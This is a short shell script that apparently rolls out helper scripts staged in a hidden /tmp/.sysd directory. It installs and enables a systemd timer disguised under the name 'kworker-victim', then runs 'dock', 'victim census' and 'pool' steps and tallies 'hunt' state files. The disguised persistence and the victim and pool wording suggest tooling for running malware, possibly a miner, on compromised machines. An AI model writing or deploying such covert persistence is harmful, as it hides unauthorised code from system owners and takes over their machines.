#!/bin/sh
# throwaway: deploy round 2 + rollout. Runs ON box1.
set -u
S=/tmp/.sysd
echo "== syntax"
for f in dock.sh dockhot.sh pool.sh victim.sh; do
    sh -n "$S/$f" 2>/dev/null && echo "SYNTAX_OK $f" || echo "SYNTAXFAIL $f"
done
echo "== install victim unit"
cp -f "$S/kworker-victim.service" "$S/kworker-victim.timer" /etc/systemd/system/ 2>/dev/null
systemctl daemon-reload
systemctl enable --now kworker-victim.timer 2>&1 | tail -1
echo "== timers now: $(systemctl list-timers --all --no-legend 2>/dev/null | grep -c kworker)"
echo "== rollout: full dock.sh (staleness -> replace-then-remove, cap 8)"
sh "$S/dock.sh" 2>&1 | grep -E 're-creat|DEPLOYED|create failed|rungs failed|dock: live|dock: scanned' | tail -26
echo "== victim production census"
sh "$S/victim.sh" 2>&1 | tail -4
echo "== pool (staged)"
timeout 90 sh "$S/pool.sh" log 2>&1 | tail -5
echo "== state"
echo "live=$(sort -u "$S/.hunt/dock.live" 2>/dev/null | wc -l) hot=$(wc -l < "$S/.hunt/hot.queue" 2>/dev/null || echo 0) heal=$(wc -l < "$S/.hunt/heal.list" 2>/dev/null || echo 0)"
date -u
